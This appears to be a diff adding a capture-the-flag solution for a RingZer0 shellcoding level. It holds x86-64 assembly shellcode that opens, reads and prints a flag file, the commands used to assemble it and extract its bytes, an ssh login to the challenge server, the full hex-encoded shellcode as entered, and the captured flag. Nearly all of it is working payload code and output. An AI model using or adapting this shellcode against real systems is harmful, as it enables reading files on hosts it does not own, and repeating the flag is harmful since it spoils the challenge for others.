@@ -1,0 +1,58 @@
+Shellcode
+*************************************************************
+_start: ; 2f 68 6f 6d  65 2f 6c 65    76 65 6c 31  2f 6c 65 76   65 6c 31 2e  66 6c 61 67
+        ; /home/le vel1/lev el1.flag
+        xor rax,rax
+        push rax
+        mov rax, 067616c662e316c65h ; galf.1le
+        push rax
+        mov rax, 076656c2f316c6576h ; vel/1lev
+        push rax
+        mov rax, 0656c2f656d6f682fh ; el/emoh/
+        push rax
+
+        ;; sys_open(file, permissions)
+        xor     rax,rax
+        mov     al, 2           ; sys_open
+        mov     rdi, rsp        ; file
+        xor     rsi, rsi        ; Read permissions
+        syscall
+
+        ;; sys_read(fd, buf, size);
+        mov     rdi, rax        ; file
+        xor     rax, rax        ; sys_read
+        xor     rdx,rdx
+        mov     dl, 128         ; size
+        sub     rsp, rdx        ; make buffer
+        mov     rsi, rsp        ; buf
+        syscall
+	
+	;; sys_write to stdout
+        mov     rsi, rsp
+        xor     rdi,rdi
+        add     dil, 1
+        xor     rdx,rdx
+        mov     dl, al
+        xor     rax, rax
+        add     al, 1
+        syscall
+
+        ;; sys_exit(return_code)
+        ;sub    spl, 128
+        xor     rax, rax
+        mov     al, 60          ; sys_exit
+        xor     rdi, rdi        ; return 0
+        syscall
+*************************************************************
+
+nasm -f elf64 -o shellcode.o shellcode.asm
+ld -o shellcode shellcode.o
+objdump -d shellcode | sed s/.*:[[:space:]]//g | sed s/[[:space:]][[:space:]].*//g
+replace spaces with \x
+
+
+ssh level1@challenges.ringzer0team.com -p 10127
+
+shellcode>\x48\x31\xc0\x50\x48\xb8\x65\x6c\x31\x2e\x66\x6c\x61\x67\x50\x48\xb8\x76\x65\x6c\x31\x2f\x6c\x65\x76\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x6c\x65\x50\x48\x31\xc0\xb0\x02\x48\x89\xe7\x48\x31\xf6\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x31\xd2\xb2\x80\x48\x29\xd4\x48\x89\xe6\x0f\x05\x48\x89\xe6\x48\x31\xff\x40\x80\xc7\x01\x48\x31\xd2\x88\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x0f\x05
+
+FLAG-1Ql864uTj8pY2470t85VX42q1B
